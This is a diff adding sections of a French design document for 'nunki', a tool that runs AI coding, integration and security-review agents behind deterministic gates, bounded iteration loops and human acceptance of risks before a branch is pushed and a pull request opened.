+   `informational = "unmaintained"` avec `patched = []`. Impossible à monter.
+   L'avis nomme pourtant une issue — `pastey`, « a drop-in replacement » —
+   mais elle est **hors d'atteinte** : il faudrait un `[patch]` vers un fork,
+   et la section 7 interdit les dépendances git, ce que `deny.toml` applique.
+   La voie a n'existe donc pas ici, et le cas tombe en b sans l'avoir choisi.
+   C'est le contrat en entier sur une seule ligne : `kind: "unmaintained"`,
+   `where: "paste 1.0.15"`, `via: "alloy"`, `fix: ""`, `accepted` renseigné,
+   `was_at_base: true`.
+
+Ces huit portes sont celles du **codeur**. Appliquées telles quelles aux deux
+autres rôles elles seraient indéfinies ou absurdes — une batterie sans
+services pour l'intégrateur, une mutation de tests système, un `PR.md` pour
+une sécurité qui ne commite pas. Donc : **chaque rôle a les portes qui correspondent à ce
+qu'il produit.**
+
+| porte | codeur | intégrateur | sécurité |
+|---|---|---|---|
+| 1 arbre propre | oui | oui | sans objet (arbre en lecture seule) |
+| 2 branche non protégée, en avance | oui | oui | sans objet |
+| 3 bloc de reprise nomme `HEAD` | oui | oui | oui (son journal) |
+| 4 périmètre | chemins protégés, zone de tests si mission de tests, jamais le fichier de services | **le câblage seulement** : la liste de chemins de son `MISSION.md` (tests système, configuration de test, fixtures, ordre des migrations) ; tout commit hors liste est hors périmètre, et le fichier de services l'est même si la liste le nomme | sans objet |
+| 5 livrable | `PR.md` | `PR.md` complété de la section intégration | le rapport, dans `VERDICT.json` |
+| 6 batterie | oui | **ses tests système verts**, dans le profil système | sans objet |
+| 7 mutation | oui | non (des tests système et de la configuration ne se mutent pas) | non |
+| 8 sécurité mécanique | audit des dépendances, scan de secrets, analyse statique par stack (`security.sh`) | idem sur ses commits | sans objet (il attaque ce qui tourne) |
+| verdict | implicite : portes vertes | `INTEGRATED` / `BROKEN` | `CLEAR` / `FINDINGS` |
+
+**Les lignes 4 et 7 tiennent ensemble, et la porte 4 le vérifie.** La ligne 7
+dispense l'intégrateur de la campagne **parce que** la ligne 4 borne son
+périmètre au câblage : tests système, configuration de test, fixtures, ordre
+des migrations. Rien là-dedans ne se mute, donc il n'y a rien à mesurer.
+
+L'accord ne tient que tant que la liste de câblage s'en tient à la ligne 4.
+Une mission qui déclare `src/**` en câblage le rompt en silence : l'intégrateur
+écrit du code de production, la porte 4 le laisse passer puisque la mission l'a
+listé, et la porte 7 ne le regarde jamais. Un câblage qui nomme
+`src/infrastructure/postgres/**` laisse l'intégrateur y écrire tout un
+adaptateur que rien ne mute, jusqu'à ce qu'un **codeur** touche le fichier
+plus tard et que la campagne rende d'un coup des centaines de survivants.
+
+La porte 4 de l'intégrateur refuse donc un chemin de **source de production**
+même déclaré en câblage, et le dit avec sa conséquence — « la porte 7 ne tourne
+pas pour l'intégrateur, donc rien ne le mutera jamais ». Un fichier de
+migration sous `src/` reste du câblage : c'est l'extension qui tranche, pas le
+préfixe, et un chemin de test n'est jamais de la source de production quelle
+que soit la sienne.
+
+**Le verdict et le `HEAD`, quand l'intégrateur commite.** « On ne pousse que
+si les trois verdicts portent le `HEAD` courant » serait impossible dès que l'intégrateur ajoute un
+commit derrière celui du codeur. La règle juste : chaque verdict porte le
+commit de **son** rôle, et le verdict du codeur **reste valable tant que tout
+ce qui a été ajouté après lui n'est que du câblage de l'intégrateur** passé
+par sa porte 4. `nunki push` exige donc `INTEGRATED` et `CLEAR` sur le dernier
+commit, et le verdict du codeur sur un ancêtre dont la différence ne contient
+que des commits de câblage. Un commit après le sien qui touche au code métier
+invalide son verdict, et le codeur repart en volet. Sans intégrateur
+(`integration: none`), le verdict du codeur est sur le dernier commit et la
+règle de l'ancêtre ne sert pas : la liste de câblage est alors **vide, pas absente**, donc n'importe quel
+commit après celui du codeur invalide son verdict, ce qui est exactement ce
+que « personne n'avait le droit de commiter après lui » veut dire.
+
+**Où vivent les verdicts.** `VERDICT.json` n'en porte
+qu'un à la fois et chaque rôle l'écrase : le fichier ne peut donc plus
+répondre « l'intégrateur est-il passé, et sur quoi ? » une fois que la
+sécurité a écrit. C'est **l'état de `nunki`** qui porte les verdicts et leurs
+`HEAD` (4.2 le disait déjà), et c'est là que `nunki push` les lit. Un rôle qui
+conclut à nouveau **remplace** sa réponse précédente : un `INTEGRATED`
+d'avant une correction n'est pas un second avis, c'en est un périmé, et
+garder les deux laisserait `nunki push` trouver le vert qu'il cherche parmi des
+réponses portant sur d'autres commits. Le verdict du codeur, lui, est
+implicite — ses portes étaient vertes — et ce qui est enregistré est le
+commit sur lequel elles l'étaient.
+
+Puis, dans l'ordre et selon la forme déclarée : la mission d'**intégration**
+(le livrable est connecté à ses infrastructures et les tests système passent,
+dans le profil système), puis la mission de **sécurité** (le livrable, intégré
+s'il y a des services, est attaqué et le rapport est `CLEAR`). L'ordre n'est
+pas arbitraire : on ne pentest pas un système qui n'est pas encore branché.
+
+### 4.5 Le flux d'une mission, et les règles d'itération
+
+Le flux tient en une boucle par étape,
+et le HQ est le seul à tenir le volant.
+
+```text
+HQ lance le CODEUR (profil mission)
+   le codeur travaille par lots, run après run, commite lot après lot,
+   jusqu'à la fin de sa mission (portes 1-4 à chaque run, 5-7 et la
+   sécurité mécanique à la fin)
+[si integration: services]
+HQ lève le profil système sur le même slot, lance l'INTÉGRATEUR sur ce HEAD
+   ├─ BROKEN  : l'intégrateur écrit son constat dans son journal et son
+   │            VERDICT.json ; le HQ reprend la main, le transcrit dans le
+   │            FOLLOWUP_HQ.md du codeur, et relance le codeur en volet —
+   │            tant que l'intégrateur échoue
+   └─ INTEGRATED
+[si security: agent]
+HQ lance la SÉCURITÉ sur ce HEAD (profil système s'il y a des services, sinon
+   profil mission ; arbre en lecture seule)
+   ├─ FINDINGS : même principe — journal de la sécurité, le HQ reprend, renvoie
+   │             au codeur, et l'intégrateur REJOUE avant la sécurité, puisque
+   │             le code a changé
+   └─ CLEAR
+l'HUMAIN valide ──► nunki push : la branche est poussée, la pull request ouverte
+```
+
+Une étape absente parce que la forme de la mission ne la déclare pas n'est
+pas une étape sautée : elle est **absente par déclaration validée**, et le
+résumé de `nunki verify` le dit en ces mots. Une porte qui ne peut pas s'exécuter,
+elle, échoue toujours.
+
+Ce que la boucle veut dire, et ce qu'elle ne veut pas dire.
+
+- **L'échec revient toujours au codeur.** L'intégrateur et la sécurité ne
+  touchent pas au code métier ; ce qu'ils constatent, c'est que le code ne
+  tient pas face au réel. Le câblage et l'environnement, l'intégrateur les
+  corrige lui-même dans sa mission, run après run, avant de conclure : un
+  `BROKEN` dit « le code doit changer », pas « je n'ai pas réussi à brancher ».
+- **Le constat vit dans le journal du rôle qui l'a fait**, et c'est le HQ qui
+  le porte au codeur, dans son `FOLLOWUP_HQ.md`, daté. L'agent ne parle
+  jamais directement à un autre agent : tout passe par le HQ et par des
+  fichiers, pour que la perte d'une session ne perde rien.
+- **Un verdict vaut pour un `HEAD`.** `VERDICT.json` porte le commit sur
+  lequel le rôle a conclu, et `nunki` le refuse s'il ne correspond pas au `HEAD`
+  réel. Un nouveau commit du codeur rend caducs l'`INTEGRATED` et le `CLEAR`
+  précédents : après une correction, l'intégrateur rejoue, puis la sécurité.
+  `nunki push` refuse sans les deux verdicts sur le `HEAD` courant — tant
+  qu'il reste un tour de sécurité (voir plus bas, tours épuisés).
+- **`nunki push` rejoue la porte 7 sur ce qu'il pousse.** Il refuse sans
+  campagne sur le `HEAD` (et nomme `nunki mission mutants <id>`, qui en lance
+  une), tant qu'un survivant de la campagne porte une proposition ni ratifiée
+  ni refusée — celle du codeur comme celle de `nunki` — en nommant chacune et
+  les deux commandes, et quand une issue lue dans le fichier du codeur est
+  refusée. Il cherche chaque test nommé **dans l'arbre du commit qu'il
+  pousse** ; la porte 7 le cherche dans l'arbre de travail qu'elle vient de
+  trouver propre. Une proposition ne bloque donc jamais la mission, elle
+  bloque le push : c'est là que le HQ répond.
+- **Rien ne se pousse en rouge.** Il n'existe pas de drapeau pour passer
+  outre. Un constat de sécurité ne se ferme que corrigé, ou démontré faux
+  positif en une phrase que le HQ contre-vérifie, ou **accepté comme risque
+  par l'humain**. L'acceptation passe par un verbe,
+  `nunki mission accept <mission> --because <pourquoi>`, qui l'écrit dans l'état
+  de `nunki` et, daté, dans le `FOLLOWUP_HQ.md` ; `VERDICT.json` reste
+  `FINDINGS` — c'est l'état qui sait que l'humain a levé le constat, et
+  `nunki push` le lit là. Aucun agent n'accepte un risque.
+
+  **La levée par `nunki` des seuls `LOW` et `INFO`.** `VERDICT.json` porte,
+  en plus du rapport, une liste `findings` où chaque constat a une sévérité
+  (`HIGH`, `MEDIUM`, `LOW`, `INFO`, selon ce qu'il permet à un attaquant)
+  et, pour `LOW` et `INFO`, une phrase `why_acceptable`. Quand l'agent
+  sécurité conclut `FINDINGS` et que **tous** les constats sont `LOW` ou
+  `INFO`, liste non vide, `nunki` lève lui-même le verdict entier : une
+  acceptation inscrite dans l'état comme celle de `mission accept`, marquée
+  comme celle de `nunki` et non d'une personne, sa raison étant la liste des
+  constats et de leurs `why_acceptable`, puis la même transition. Ce n'est
+  pas un agent qui accepte : c'est une règle de `nunki`, sur le classement de
+  l'agent, et elle est décidée sur le verdict lu une seule fois. Fermé par
+  défaut : sans liste, liste vide, liste illisible, sévérité inconnue,
+  constat sans titre visible, `LOW`/`INFO` sans raison visible, un seul
+  `MEDIUM` ou `HIGH`, ou un `CLEAR` qui porte des constats : arrêt à
+  `Findings`, ou verdict refusé, comme avant. La levée par `nunki` obéit à
+  toutes les règles de `push` sur la levée humaine ; `FOLLOWUP_HQ.md` la
+  consigne avec les constats, `mission status` la liste, `push` l'affiche
+  sous « accepted by nunki (LOW/INFO) ».
+
+  **Deux formes, et deux verbes**, pour nommer par quoi passe le geste du
+  HQ :
+
+  - `nunki mission accept <mission> --finding <nom> --because <pourquoi>`
+    **inventorie** un constat levé et ne conclut rien : itérer sur la liste
+    n'est pas la clore, et une session qui prendrait la première acceptation
+    pour la dernière pousserait sur un rapport que personne n'a fini de lire.
+    Sans `--finding`, c'est ce que le rapport porte encore qui est levé, et
+    la mission conclut.
+  - `nunki mission accept <mission> --fixed-by <commit> --because <comment
+    le HQ l'a vérifié>` lève le rapport entier **comme corrigé**, et non
+    comme un risque accepté : le codeur l'a corrigé après le dernier tour,
+    l'agent sécurité n'a pas attaqué la correction, et le HQ l'a vérifiée.
+    Mesuré (#162) : sur une mission `critical`, le troisième tour rapporte
+    un `MEDIUM`, le codeur le corrige, et la seule levée possible était
+    l'acceptation d'un risque — la pull request disait « accepted, not
+    fixed » d'un constat corrigé, et le HQ a dû y ajouter un paragraphe à
+    lui. Seulement une fois les tours épuisés : tant qu'il en reste un, il
+    attaque la correction, et c'est le chemin d'`iterate`. Le commit doit
+    venir après celui que le dernier tour a attaqué et être sur la branche
+    poussée. Il n'est lu qu'en hexadécimal, si bien que rien de ce qui est
+    passé là ne peut se lire comme une option de git, et il est inscrit par
+    son identifiant complet. Le HQ l'apprend où il lit quoi faire :
+    `mission wait`, `verify` et le `FOLLOWUP_HQ.md` du plafond des tours le
+    nomment à côté d'`accept` dès que les tours sont épuisés. Si plusieurs
+    levées suivent le dernier rapport, la plus récente décide entre corrigé
+    et accepté.
+  - `nunki mission iterate <mission>` renvoie au codeur en volet. C'est un
+    **geste**, pas un défaut : un `verify` qui renverrait de lui-même
+    dépenserait un volet que l'humain voulait peut-être dépenser en
+    acceptation.
+  - **Et une mission vérifiée se relit avant de se pousser.** Le HQ relit le
+    code (2) ; ce qu'il refuse repart au codeur par le même verbe,
+    `nunki mission iterate <mission> --because <ce qui est refusé>`, depuis
+    `Verified`. La raison est **obligatoire** : c'est ce que le codeur lit,
+    écrite dans `FOLLOWUP_HQ.md`, et la cause du volet. C'est un volet comme
+    les autres, compté dans la même borne ; sans volet restant, la mission
+    est rendue à l'humain et `retry` rend la borne. Sans ce geste, une
+    branche vérifiée qui porte un commit hors de son sujet — un contournement
+    d'un défaut de l'outillage, par exemple — ne peut que partir telle quelle
+    ou être abandonnée.
+  - **Aux portes, sur une campagne incomplète** (arrêtée à son délai ou
+    annulée, 4.4), `iterate --because` est accepté aussi, et à la campagne
+    finale du niveau `critical` : il ouvre un volet comme une
+    porte 7 rouge, avec la raison dans `FOLLOWUP_HQ.md`. Ce n'est pas une
+    revue : le niveau d'exigence ne le borne pas, et `--override` y est
+    refusé, faute de rien à outrepasser.
+  - `--because` n'est jamais facultatif : un risque accepté sans raison n'est
+    pas accepté, il est oublié.
+  - **Une acceptation vaut pour un `HEAD`**, comme le verdict qu'elle lève.
+    Un nouveau commit la périme au lieu de la reporter en silence. Seule
+    exception : une fois les tours de sécurité épuisés, la levée du dernier
+    verdict vaut pour les commits venus après lui (ci-dessous).
+- **Les tours de sécurité sont bornés par le niveau d'exigence.** Un tour
+  est un verdict que l'agent sécurité conclut (`CLEAR` ou `FINDINGS`) :
+  aucun au niveau `prototype`, un au niveau `standard`, trois au niveau
+  `critical`. Quand les portes passent et que la sécurité viendrait ensuite,
+  tours épuisés, l'agent n'est pas lancé. Si le dernier verdict conclu est
+  `CLEAR`, la mission passe `Verified`. S'il est `FINDINGS`, elle revient à
+  `Findings` avec ce dernier rapport : **la borne ne vérifie jamais seule**,
+  `Verified` reste atteint par un `CLEAR` ou par une levée humaine
+  (`accept`), et un `iterate` ouvre un volet borné comme les autres.
+  `FOLLOWUP_HQ.md` consigne la borne atteinte (`n / max`) et que la
+  correction venue après le dernier tour n'a pas été attaquée.
+  - **`push`, tours épuisés.** Aucun verdict ne peut plus venir sur un
+    commit ultérieur : le dernier verdict conclu vaut donc pour les commits
+    venus après lui sur la branche — un `CLEAR` tel quel, un `FINDINGS`
+    seulement si un humain a levé le verdict entier **après** sa conclusion,
+    sur son commit ou un commit ultérieur de la branche. Un verdict sur un
+    commit que la branche ne contient pas est refusé. `push` et
+    `FOLLOWUP_HQ.md` nomment ces commits « non attaqués par l'agent
+    sécurité ». Tant qu'un tour reste, la règle du `HEAD` est inchangée.
+  - **Une levée tient.** `accept` efface le rapport retenu : après une
+    levée, une revue du HQ dont le volet passe les portes à la borne est
+    vérifiée, et le rapport levé ne revient pas.
+  - **Un `prototype`** ne joue aucun tour, et `push` ne lui demande aucun
+    verdict de sécurité, comme pour `security: gates`.
+- **La boucle est bornée, et la borne est un paramètre** : **trois volets**
+  par défaut. Au troisième retour au codeur
+  sur une même mission, le HQ ne relance pas : il s'arrête et remonte à
+  l'humain, avec les trois constats côte à côte. La valeur se règle dans
+  `nunki.yaml` et par mission (`MISSION.md` prime), jamais en dur dans le
+  moteur ; la mettre à zéro n'est pas « sans limite » mais « aucune
+  itération : le premier rouge remonte ». **La borne vaut pour toute la vie
+  de la mission** : les volets se comptent par la longueur de leurs causes
+  enregistrées, jamais par un compteur qu'un verbe remet à zéro, et la
+  dépasser est une décision du HQ, un volet par `retry`, écrite. Un renvoi
+  du HQ après revue (`iterate --because` depuis `Verified`) est un volet
+  comme un autre ; au niveau `standard`, un second demande `--override`.
+- **Le niveau d'exigence lie aussi le HQ.** `nunki mission iterate` sur un
+  `FINDINGS` est refusé quand le niveau dit que le rapport ne bloque pas :
+  à `standard`, un rapport sans `HIGH` ; à `critical`, à partir du deuxième
+  tour, un rapport sans `HIGH`. Un rapport dont les constats ne portent pas
+  de sévérité lisible bloque, comme avant. Le refus nomme les deux voies :
+  `mission accept --because`, ou `mission iterate --override --because
+  <pourquoi>`, écrit daté dans `FOLLOWUP_HQ.md` comme un écart au niveau
+  d'exigence ; `--override` là où rien n'est refusé est refusé.
+  `mission status` liste chaque écart avec sa raison, `nunki push` les
+  ajoute au corps de la pull request (« Departures from the rigor ») sans
+  toucher `PR.md`, et la ligne de `mission wait` sur un rapport qui ne
+  bloque pas le dit et nomme `accept` d'abord. La règle d'arrêt des tours
+  ne tient plus à la discipline du HQ : l'outil la tient.
+- **Un constat accepté n'est pas un constat corrigé, et la pull request est
+  publiée.** Quand le verdict de sécurité sur lequel `nunki push` s'appuie
+  est un `FINDINGS` levé — par `mission accept`, ou par `nunki` pour des
+  `LOW`/`INFO` —, ses constats ne sont pas corrigés, et le rapport de
+  l'agent sécurité les décrirait sur la forge, où une modification
+  ultérieure laisse l'original dans l'historique.
+  - **L'agent sécurité n'écrit pas dans `PR.md`.** Son profil ne monte pas
+    le fichier en écriture : il le lit par le montage en lecture seule du
+    dossier, comme `MISSION.md`, et ne peut ni l'écrire, ni le remplacer, ni
+    le retirer. Son rapport, dans `VERDICT.json`, est tout son livrable.
+    C'est là la garde : rien de ce que `nunki push` retient ne dépend d'une
+    lecture du Markdown. Mesuré sur un moteur réel, y compris au changement
+    de rôle sur un même projet Compose : le conteneur de l'agent sécurité
+    est un autre que celui du codeur ou de l'intégrateur, et `PR.md` n'y
+    est pas en écriture.
+  - **`nunki push` écrit la section Security de la pull request.** Le corps
+    envoyé est le texte de `PR.md`, inchangé, puis la note sur les écarts,
+    puis une section sous le titre `## Security`, écrite par `nunki` à
+    partir du verdict de sécurité sur lequel le push s'appuie :
+    - sans agent sécurité (ou un `prototype`, qui ne joue aucun tour),
+      aucune section ;
+    - sur un `CLEAR`, le commit attaqué, puis le rapport tel que l'agent l'a
+      écrit ;
+    - sur un `FINDINGS` levé, retenu, la note : combien de constats par
+      sévérité, acceptés par qui (le HQ, ou `nunki` pour des `LOW`/`INFO`),
+      et que leur détail est retenu jusqu'à leur correction — aucun mot du
+      rapport, d'un titre de constat ni d'un `why_acceptable`, ni dans le
+      titre ni dans le corps ;
+    - sur un `FINDINGS` levé comme corrigé (`--fixed-by`), retenu : combien
+      de constats par sévérité, le commit qui les a corrigés, que l'agent
+      sécurité ne l'a pas attaqué et qui l'a vérifié — mais ni la raison du
+      HQ, qui peut décrire le constat autant que la correction, ni la
+      promesse de publier « une fois corrigé » : une correction que l'agent
+      n'a pas attaquée n'ouvre pas le rapport ;
+    - sur un `FINDINGS` levé comme corrigé, publié : le commit, qui l'a
+      vérifié et comment, puis les constats et le rapport ;
+    - sur un `FINDINGS` levé, publié, qui l'a accepté, chaque constat avec
+      sa sévérité, son titre et sa raison, puis le rapport.
+
+    Quand les tours sont épuisés, la section nomme aussi les commits que
+    l'agent sécurité n'a pas attaqués. Le rapport est cité ligne à ligne
+    (`> `), après que chaque caractère de contrôle a été rendu visible : un
+    `\r` seul, que la forge lit comme un saut de ligne, ne peut pas faire
+    sortir une ligne de la citation. La section vient en dernier, après la
+    note sur les écarts : rien de ce que `nunki` écrit ne suit la prose de
+    l'agent. `PR.md` lui-même n'est pas touché.
+  - **Le rapport et les constats viennent de l'état de `nunki`**, gardés
+    avec le verdict quand `verify` le conclut, depuis la lecture même sur
+    laquelle le verdict et la levée sont décidés. `nunki push` ne lit jamais
+    `VERDICT.json`, que chaque rôle réécrit. Un état écrit par un `nunki`
+    plus ancien n'en garde rien : la section dit alors que le nombre, les
+    constats ou le rapport n'ont pas pu être lus, plutôt que de les deviner
+    ou de lire le verdict d'un autre rôle.
+  - **Le projet décide, dans `nunki.yaml`** : `security_findings: withhold`
+    (le défaut, et ce que veut dire une clé absente) ou `publish`, pour un
+    dépôt que seuls ses propriétaires lisent.
+  - **Sans `PR.md`, ou vide, il n'y a pas de pull request** : la branche est
+    poussée, aucune pull request n'est ouverte, et `nunki push` le dit.
+  - `nunki push` dit ce qu'il a retenu, et sur combien de constats.
+    `VERDICT.json` et `FOLLOWUP_HQ.md` les gardent en entier : rien n'est
+    caché au HQ. Après `mission accept`, `mission status` montre l'étape et
+    plus le rapport.
+  - **Un seul cas de transition, grossier exprès.** Une mission dont l'agent
+    sécurité a tourné sous un `nunki` plus ancien a écrit sa section dans
+    `PR.md`, comme son rôle le lui disait. Un push qui doit retenir refuse
+    donc, avant que rien ne parte, un `PR.md` qui porte une ligne où un `#`
+    précède la première lettre et où les premières lettres sont
+    `security`, sans égard à la casse (les sauts de ligne sont ceux de la
+    forge : `\n`, `\r\n`, un `\r` seul). Il nomme chaque ligne et les deux
+    issues : éditer `PR.md` (le HQ le peut), ou
+    `security_findings: publish`. Il refuse ; il ne coupe jamais, et ne
+    décide nulle part où une section finit. Ce refus n'est pas la garde (la
+    garde est le montage) : il rappelle au HQ de lire `PR.md`.
+  - **La limite, écrite.** Ce que le codeur ou l'intégrateur écrit dans
+    `PR.md` est publié tel quel, un constat qu'ils décriraient compris :
+    `nunki` ne lit pas leur prose, et le HQ lit `PR.md` avant un push. Une
+    forme que le refus de transition ne voit pas (`<h2>Security</h2>`,
+    `Security` souligné de `===`, un titre qui commence par un autre mot)
+    relève de cette limite. Une pull request ouverte à la main l'est depuis
+    `PR.md` tel qu'il est, sans la section que `nunki` aurait écrite.
+- **Une décision attendue n'est pas une borne épuisée.** Un codeur qui finit
+  son lot hormis des survivants qu'il ne peut ni tuer ni figer en bug le
+  termine par `Lot: <lot> — awaits ruling: <quoi>`. `nunki` vérifie que
+  chaque identifiant nommé est un survivant de `MUTANTS.json` sans issue (ni
+  celle du HQ, ni celle du codeur) — une ligne qui n'en nomme aucun est une
+  tentative échouée — puis rend la mission tout de suite,
+  `AwaitingRuling { lot, what, attempt, survivors }`, sans consommer de
+  tentative. Un survivant qui porte déjà une proposition valide n'est pas
+  « sans issue » et ne peut pas être nommé. Le HQ tranche
+  (`nunki mission mutants <id> --equivalent … --because …`) puis reprend. Depuis cette remise, `retry` reprend le même
+  travail **à la tentative suivante**, sans rendre de budget, ou, si la
+  tentative qui demandait était la dernière, rend la mission comme
+  `LotAttemptsExhausted` : aucune tentative ne dépasse la borne, et
+  `FOLLOWUP_HQ.md` dit lequel des deux.
+- **Des services que personne n'a approuvés.** Là où un profil système est
+  dû (intégration, agent de sécurité), un fichier de services dont le rendu
+  n'est pas approuvé rend la mission à l'humain : la remise nomme le
+  fichier et l'empreinte du commit d'où part la branche, ne consomme aucune
+  tentative, et `retry` reprend le même rôle à la même tentative ; ses verbes
+  nomment la mission (`nunki services --show <mission>`, `--approve
+  <empreinte> <mission>`), pour que l'approbation lise là où le profil lit.
+  `nunki check --mission` en fait une ligne rouge. `mission
+  start` pose déjà la question (4.2, règle 1), et aucune modification d'un
+  agent n'est levée : cette remise ne reste que pour un rendu que le
+  lancement n'a pas vu sans approbation — une approbation retirée depuis, ou
+  une mission lancée avant que la question y soit posée.
+- **Et la main rendue se reprend.** Hors décision attendue, les façons
+  d'atteindre « rendue à l'humain » sont une borne qui s'épuise — les
+  tentatives d'un lot, celles d'un rôle, les volets. `resume` lève une suspension, `iterate` et `accept`
+  ne partent que de `FINDINGS`, et le moniteur abandonne l'étape : sans verbe
+  pour en sortir, une mission qui a épuisé ses volets serait finie sans être
+  terminée.
+  `nunki mission retry <mission> --because <ce qui a changé>` la reprend, sur
+  le travail où elle s'est arrêtée. Il rend entières les tentatives d'un lot
+  ou d'un rôle — remettre ce compteur *est* le verbe, pas un effet de bord :
+  sans cela le rouge suivant retombe dans la même remontée. Les volets, non :
+  après `VoletsExhausted`, `retry` en accorde **un**, écrit daté dans
+  `FOLLOWUP_HQ.md` (« Volet 4 of 3, granted by the HQ: <pourquoi> »), et le
+  rouge suivant rend de nouveau la mission. Un `retry` depuis une autre
+  remise ne touche pas au compte. `mission status` affiche `volets n / cap`
+  et, au-delà, `(m granted by the HQ)` ; la ligne de `mission wait` sur
+  `VoletsExhausted` nomme le compte et le verbe. Mesuré avant ce changement :
+  10 missions sur 50 dépassaient trois volets, l'une en comptait douze. La raison n'est pas facultative et ne
+  va pas que dans l'état : elle est écrite dans `FOLLOWUP_HQ.md`, que chaque
+  rôle lit avant tout le reste, parce que ni l'arbre ni la cause n'ont bougé
+  d'eux-mêmes — un `retry` qui ne dit rien rachète la même remontée. Une
+  mission que l'humain a **appelée off** avec `end` n'est pas une borne
+  épuisée : elle est refusée, sinon `end` deviendrait un verbe sur lequel il
+  ne peut pas compter.
+- **Savoir quand la mission s'arrête.** `nunki mission wait <mission>` bloque
+  jusqu'à un arrêt sur lequel quelqu'un doit agir, puis écrit une ligne,
+  `<id> · <étape> · <détail> · awaits <qui>: <quoi>`, et sort avec un code
+  par sorte d'arrêt : 0 vérifiée (ou déjà poussée, ou archivée), 10
+  `FINDINGS`, 11 rendue à l'humain (une décision attendue comprise), 12
+  suspendue ou fenêtre du compte épuisée, 13 moniteur arrêté sur une erreur
+  ou porte injouable, 14 aucun moniteur alors que l'étape n'est pas un
+  arrêt, 15 délai `--timeout` atteint. **Les verbes qui lancent ou trouvent
+  le moniteur la nomment** sous sa ligne — `mission start`, `verify`,
+  `mission resume`, `mission retry` : c'est là, au moment où il agit, que le
+  HQ apprend qu'il peut être prévenu de l'arrêt au lieu de sonder
+  `mission status`, quel que soit son harnais (4.3). Elle **lit** et ne conduit jamais :
+  aucun verrou, aucun lancement (ouvrir l'état peut créer ses répertoires
+  manquants). Le moniteur termine son journal sur la même ligne, construite
+  par la même fonction, et son journal n'écrit que ce qui change. L'état
+  porte une révision, avancée à chaque écriture ; le moniteur consigne
+  pourquoi il s'arrête avec la révision de l'état sur lequel il s'arrête, et
+  `wait`, qui lit le moniteur avant l'état, ne tient ce mot pour actuel que
+  sur cette révision. Tout texte écrit par un agent ou un auteur de commit
+  est affiché échappé : caractères de contrôle, bidirectionnels et
+  invisibles rendus visibles, jamais bruts.
+- **Un run tombé pour une cause du harnais ne compte pas.** Quota atteint,
+  jeton expiré, réseau, plantage : `nunki` attend et rejoue le run, sans
+  consommer une tentative ni un volet, ni écrire un verdict, avec l'attente
+  croissante et le plafond de 4.3. Seul un run fini, ou échoué pour une cause
+  de la mission (blocage constaté, contrat non rempli), avance la machine à
+  états.
+
+## 5. Pris à l'existant, construit ici
+
+Vérifié sur les pages des projets et la documentation officielle.
+
+| besoin | candidat existant | verdict |
+|---|---|---|
+| règles lues par tout harnais | `AGENTS.md` (standard de fait ; Claude Code le lit seul, ou par import `@AGENTS.md` ou lien derrière un `CLAUDE.md`, documenté) | **pris** |
+| outils exposés à tout harnais | MCP | **pris** pour ce qui doit être appelé par l'agent |
+| compétences réutilisables | `SKILL.md`, standard ouvert (agentskills.io), adopté par OpenCode, Codex, Gemini CLI, Cursor, Copilot, Goose, Roo, Kiro, Amp | **pris** |
+| slots isolés par agent, multi-harnais | Vibe Kanban (en fin de vie), claude-squad (déprécié en février 2026), Conductor (Mac seulement), Container Use (Dagger, vivant) | **construit ici** : aucun ne garantit l'`origin` inatteignable, deux sont morts, et c'est trois appels |
+| bac à sable | conteneurs OCI par Compose généré ; devcontainer réduit à une vue IDE ; micro-VM (bacs à sable Docker pour agents, `container` d'Apple : macOS 26 et Apple silicon seulement) pour l'isolation du noyau | **pris** (Compose) ; micro-VM à évaluer un jour pour l'agent sécurité, jamais comme base |
+| pilotage par spec, rôles d'agents | spec-kit (GitHub), méthode BMAD | à lire ; BMAD a des rôles (dev, QA…) mais ni intégrateur branché sur de l'infra réelle, ni HQ, ni portes |
+| services d'intégration jetables | le fichier Compose des services du projet, fusionné dans le Compose généré par `nunki` | **pris**. Pas Testcontainers : il lève des conteneurs depuis le processus de test, donc depuis le conteneur de l'agent, donc avec le socket Docker — ce que 3.2 interdit |
+| protocole de mission, contrat de run, reprise à froid | — | **construit ici** : personne ne le livre |
+| portes de vérification déterministes | — | **construit ici** |
+| HQ comme lieu de décision, journal en trois étages | — | **construit ici** |
+| agent sécurité en boucle | outils de scan par stack (audit de dépendances, SAST, fuzzers), à orchestrer | **construit ici** pour l'orchestration, outils pris |
+| la règle « refuser est sûr, demander est dangereux » | — | **construit ici**, et à écrire dans chaque adaptateur |
+
+## 6. Ce que cette version ne dit pas encore
+
+- Le format de la prose de `MISSION.md` et de `JOURNAL.md`, à reprendre des
+  gabarits existants ; seul l'en-tête structuré est fixé (4.1).
+- Le schéma exact de `nunki.yaml`, de l'en-tête de mission, de `VERDICT.json`
+  (dont le champ `findings` est désormais fixé, 4.5)
+  et des définitions de profil : leurs champs sont nommés ici, leur forme se
+  fixe avec le premier code, et se versionne.
+- L'observabilité (Langfuse ou autre), volontairement hors du socle.
+
+## 7. Ce que ça coûte, dit une fois
+
+Voici l'addition.
+
+- **Un cycle complet, au pire cas** : une mission codeur, sept portes dont la
+  mutation, une mission d'intégration, une mission de sécurité, puis jusqu'à
+  trois fois (volet codeur, portes, intégration, sécurité). Sur un projet
+  moyen, c'est une journée. La borne de trois volets et la mutation qui ne
+  rejoue que sur changement sont ce qui l'empêche de doubler.
+- **La consommation** : trois rôles par mission triplent les tokens d'une
+  mission solitaire, et tout est pris sur la **fenêtre de l'abonnement**
+  de l'humain, partagée avec sa session HQ (4.3) : plusieurs slots en parallèle
+  la saturent, et la session HQ avec. `nunki.yaml` porte un **plafond par
+  mission en tokens et en runs** et un comportement en quota atteint
+  (attendre, puis remonter à l'humain), parce que sans plafond une boucle
+  bornée à trois volets peut encore consommer une nuit de fenêtre. Claude
+  Code rend la consommation dans sa sortie structurée, en quatre sortes
+  (entrée, sortie, cache écrit, cache lu — mesuré sur v2.1.266), et le trait
+  la rend pour tout run fini, quelle qu'en soit l'issue : un run tombé pour
+  quota a consommé aussi. `max_runs` et
+  `max_tokens` sont **facultatifs et sans valeur par défaut** — les runs sont
+  déjà bornés par les tentatives et les volets (pire cas légitime d'une
+  mission de deux lots : 48), et un chiffre de tokens attend des missions
+  réelles mesurées ; d'ici là `nunki mission status` affiche ce que chaque
+  mission a dépensé, sorte par sorte. `max_tokens` compte les quatre sortes
+  additionnées. Le plafond se vérifie **entre deux runs**, au site de
+  lancement : un run en cours n'est jamais tué pour lui, si bien qu'une
+  mission peut le dépasser d'un run au plus ; atteint, `nunki` pose sa retenue
+  avec la raison, et on le relève dans l'en-tête, par `nunki mission reframe`,
+  puis `nunki mission resume`. Un run se compte quand `nunki verify` le
+  relit, quel que soit le rôle — le premier run du codeur compris, lancé par
